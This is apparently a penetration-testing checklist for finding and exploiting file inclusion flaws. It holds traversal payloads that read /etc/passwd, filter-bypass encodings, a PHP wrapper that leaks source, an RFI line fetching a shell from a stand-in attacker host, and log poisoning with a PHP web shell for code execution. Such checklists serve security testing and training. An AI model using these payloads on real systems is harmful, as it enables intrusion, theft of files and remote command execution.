---
title: "File Inclusion (LFI / RFI)"
tags: [methodology, lfi, rfi]
summary: "Discovery and exploitation of Local/Remote File Inclusion vulnerabilities — path traversal, filter bypasses, PHP wrappers, and log poisoning for RCE."
draft: false
---

## 1. Discovery
- [ ] Identify parameters that pass filenames (e.g., `?page=about.php`, `?file=doc.pdf`, `?template=main`).
- [ ] Test basic LFI by traversing directories: `../../../../etc/passwd` (Linux) or `..\..\..\..\ Windows\win.ini` (Windows).

## 2. Bypassing Filters
- [ ] Try extra traversal depth: `../../../../../../../../etc/passwd`.
- [ ] URL Encoding: `%2e%2e%2f` (../) or double encoding `%252e%252e%252f`.
- [ ] Null byte injection (PHP < 5.3): `../../../etc/passwd%00`.
- [ ] Stripped filter bypass: `....//....//....//etc/passwd`.
- [ ] Try wrappers (PHP): `php://filter/convert.base64-encode/resource=index.php`.

## 3. Remote File Inclusion (RFI)
- [ ] Check if remote URLs are fetched: `http://attacker.com/shell.txt`.
- [ ] If blocked, try `http://127.0.0.1` to see if SSRF is possible.

## 4. Escalation to RCE (Log Poisoning)
- [ ] Find log files (e.g., `/var/log/apache2/access.log`, `/var/log/auth.log`).
- [ ] Inject PHP payload into User-Agent or SSH login (`ssh '<?php system($_GET["c"]); ?>'@target`).
- [ ] LFI the log file and execute via `?c=id`.
